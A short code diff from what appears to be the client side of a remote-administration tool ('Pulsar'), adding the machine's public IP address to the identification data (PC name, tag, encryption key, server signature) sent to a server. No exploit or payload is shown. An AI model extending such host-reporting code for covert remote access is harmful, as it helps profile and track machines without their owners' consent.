@@ -182,7 +182,8 @@ namespace Pulsar.Client.Networking
                     PcName = SystemHelper.GetPcName(),
                     Tag = Settings.TAG,
                     EncryptionKey = Settings.ENCRYPTIONKEY,
-                    Signature = Convert.FromBase64String(Settings.SERVERSIGNATURE)
+                    Signature = Convert.FromBase64String(Settings.SERVERSIGNATURE),
+                    PublicIP = geoInfo.IpAddress ?? "Unknown"
                 });
             }
         }
